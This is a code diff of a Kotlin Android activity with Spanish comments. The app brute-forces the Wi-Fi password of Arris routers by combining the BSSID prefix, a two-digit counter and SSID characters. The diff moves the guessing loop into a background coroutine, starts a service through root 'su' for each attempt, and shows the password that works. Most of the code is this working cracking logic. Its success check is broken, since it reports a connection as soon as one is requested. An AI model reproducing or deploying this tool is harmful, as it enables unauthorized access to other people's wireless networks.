@@ -1,7 +1,7 @@
 package com.example.wi_fi.ui.theme
 
-import android.content.ClipboardManager
 import android.content.Context
+import android.content.Intent
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
@@ -10,26 +10,26 @@ import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiNetworkSpecifier
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
-import android.view.LayoutInflater
-import android.view.View
 import android.widget.ImageButton
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.annotation.RequiresApi
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import com.example.wi_fi.R
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 class arrisWifiDetailsActivity : AppCompatActivity() {
-    private val TAG = "WifiUtils"
-    private lateinit var ssid: String
-    private lateinit var bssid: String
-    private var connectionAttempts = 0
-    private lateinit var passwordList: List<String>
-    private lateinit var lastPassword: String
+    protected lateinit var ssid: String
+    protected lateinit var bssid: String
+    protected lateinit var lastPassword: String
 
+    private val TAG = "WifiUtils"
+
+    @RequiresApi(Build.VERSION_CODES.Q)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.arris_activity_wifi_details)
@@ -60,8 +60,7 @@ class arrisWifiDetailsActivity : AppCompatActivity() {
         }
 
         connectButton.setOnClickListener {
-            generatePasswordsList()
-            tryNextPassword()
+            tryPasswordsInBackground()
         }
 
         val backButton: ImageButton = findViewById(R.id.arrisbackButton)
@@ -71,52 +70,66 @@ class arrisWifiDetailsActivity : AppCompatActivity() {
     }
 
     private fun copyToClipboard(text: String, label: String) {
-        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
         val cleanedText = text.substringAfter(": ").trim()
         val clip = android.content.ClipData.newPlainText("Copied Text", cleanedText)
         clipboard.setPrimaryClip(clip)
         Toast.makeText(this, "$label copiado", Toast.LENGTH_SHORT).show()
     }
 
-    private fun generatePasswordsList() {
-        val decimalRange = (99 downTo 0).toList()
-        passwordList = decimalRange.map { it.toString() }
-    }
-
-    private fun tryNextPassword() {
-        if (connectionAttempts < passwordList.size) {
-            val password = getPassword(ssid, bssid, passwordList[connectionAttempts])
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                connectToWifi(ssid, password)
-            } else {
-                connectToWifiLegacy(ssid, password)
+    @RequiresApi(Build.VERSION_CODES.Q)
+    protected fun tryPasswordsInBackground() {
+        GlobalScope.launch(Dispatchers.IO) {
+            var isConnected = false
+            for (i in 99 downTo 0) {
+                val password = String.format("%02d", i)
+                val generatedPassword = getPassword(bssid, ssid, password)
+                val result = tryPassword(generatedPassword)
+                if (result == 0) {
+                    // La contraseña es correcta, intenta conectarse
+                    isConnected = connectToWifi(ssid, generatedPassword)
+                    if (isConnected) {
+                        // Conexión exitosa
+                        withContext(Dispatchers.Main) {
+                            // Muestra un mensaje de conexión exitosa y la contraseña
+                            Toast.makeText(this@arrisWifiDetailsActivity, "Conexión exitosa", Toast.LENGTH_SHORT).show()
+                            Toast.makeText(this@arrisWifiDetailsActivity, "Contraseña: $generatedPassword", Toast.LENGTH_SHORT).show()
+                        }
+                        break
+                    }
+                } else if (i == 99) {
+                    // Muestra un Toast con la primera contraseña que se intentará
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(this@arrisWifiDetailsActivity, "Intentando contraseña: $generatedPassword", Toast.LENGTH_SHORT).show()
+                    }
+                }
             }
 
-            connectionAttempts++
-        } else {
-            // Se han probado todas las contraseñas de la lista
-            showPasswordNotFoundDialog()
+            // Se han probado todas las contraseñas de la lista y no se ha conectado
+            if (!isConnected) {
+                // Manejar el caso según sea necesario
+            }
         }
     }
 
-    private fun showPasswordNotFoundDialog() {
-        val dialogBuilder = AlertDialog.Builder(this)
-        dialogBuilder.setTitle("Contraseña no encontrada")
-        dialogBuilder.setMessage("Se han probado todas las contraseñas de la lista. ¿Desea probar con la siguiente contraseña?")
-        dialogBuilder.setPositiveButton("Sí") { dialog, _ ->
-            dialog.dismiss()
-            tryNextPassword()
+    protected fun tryPassword(password: String): Int {
+        val packageName = "com.example.wi_fi"
+        val serviceName = "Arris_tracker_service"
+
+        val command = "am startservice -n $packageName/$serviceName --es ssid \"$ssid\" --es password \"$password\""
+
+        try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            return process.waitFor()
+        } catch (e: Exception) {
+            e.printStackTrace()
+            // Manejar excepciones aquí
+            return -1
         }
-        dialogBuilder.setNegativeButton("No") { dialog, _ ->
-            dialog.dismiss()
-            finish()
-        }
-        val dialog = dialogBuilder.create()
-        dialog.show()
     }
 
     @RequiresApi(Build.VERSION_CODES.Q)
-    private fun connectToWifi(ssid: String, password: String) {
+    protected fun connectToWifi(ssid: String, password: String): Boolean {
         val specifier = WifiNetworkSpecifier.Builder()
             .setSsid(ssid)
             .setWpa2Passphrase(password)
@@ -129,69 +142,30 @@ class arrisWifiDetailsActivity : AppCompatActivity() {
 
         val connectivityManager =
             getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        connectivityManager.requestNetwork(request, object : ConnectivityManager.NetworkCallback() {
+        val callback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
                 super.onAvailable(network)
                 // Acciones cuando se establece la conexión exitosamente
-                runOnUiThread {
-                    Toast.makeText(this@arrisWifiDetailsActivity, "Conexión exitosa", Toast.LENGTH_SHORT).show()
-
-                    val dialogView = LayoutInflater.from(this@arrisWifiDetailsActivity).inflate(R.layout.connected_password_dialog, null)
-                    val passwordTextView: TextView = dialogView.findViewById(R.id.passwordTextView)
-                    passwordTextView.text = password
-
-                    val dialogBuilder = AlertDialog.Builder(this@arrisWifiDetailsActivity)
-                        .setTitle("Conectado")
-                        .setView(dialogView)
-                        .setPositiveButton("Copiar") { _, _ ->
-                            copyToClipboard(password, "Contraseña: ")
-                            Toast.makeText(this@arrisWifiDetailsActivity, "Contraseña copiada al portapapeles", Toast.LENGTH_SHORT).show()
-                        }
-                        .setNegativeButton("Cerrar") { dialog, _ ->
-                            dialog.dismiss()
-                        }
-
-                    val dialog = dialogBuilder.create()
-                    dialog.show()
-                }
             }
 
             override fun onUnavailable() {
                 super.onUnavailable()
                 // Acciones cuando la conexión no está disponible
-                Toast.makeText(this@arrisWifiDetailsActivity, "Conexión no disponible", Toast.LENGTH_SHORT).show()
-                tryNextPassword()
             }
-        })
-
-        // Registra la contraseña utilizada en el logcat
-        Log.d(TAG, "Se está intentando utilizar la contraseña: $password para conectarse a la red $ssid")
-    }
-
-
-    private fun connectToWifiLegacy(ssid: String, password: String) {
-        val wifiConfiguration = WifiConfiguration()
-        wifiConfiguration.SSID = "\"$ssid\""
-        wifiConfiguration.preSharedKey = "\"$password\""
-
-        val wifiManager =
-            applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-        val networkId = wifiManager.addNetwork(wifiConfiguration)
-
-        if (networkId != -1) {
-            wifiManager.enableNetwork(networkId, true)
-            wifiManager.reconnect()
-            Toast.makeText(this, "Intentando conectar a la red WiFi", Toast.LENGTH_SHORT).show()
-        } else {
-            Toast.makeText(this, "Error al agregar la configuración de red WiFi", Toast.LENGTH_SHORT).show()
-            tryNextPassword()
         }
 
-        // Registra la contraseña utilizada en el logcat
-        Log.d(TAG, "Se está intentando utilizar la contraseña: $password para conectarse a la red $ssid")
+        try {
+            connectivityManager.requestNetwork(request, callback)
+            // La conexión se establecerá de forma asíncrona, y las acciones se manejarán en el callback
+            return true
+        } catch (e: Exception) {
+            e.printStackTrace()
+            // Manejar excepciones aquí
+            return false
+        }
     }
 
-    private fun getPassword(ssid: String, bssid: String, password: String): String {
+    protected fun getPassword(bssid: String, ssid: String, password: String): String {
         val bssidDigits = bssid.replace(":", "").substring(0, 6).toUpperCase()
         val ssidDigits = ssid.replace("-", "").replace(".", "").substring(5, 9).toUpperCase()
         return "$bssidDigits$password$ssidDigits"
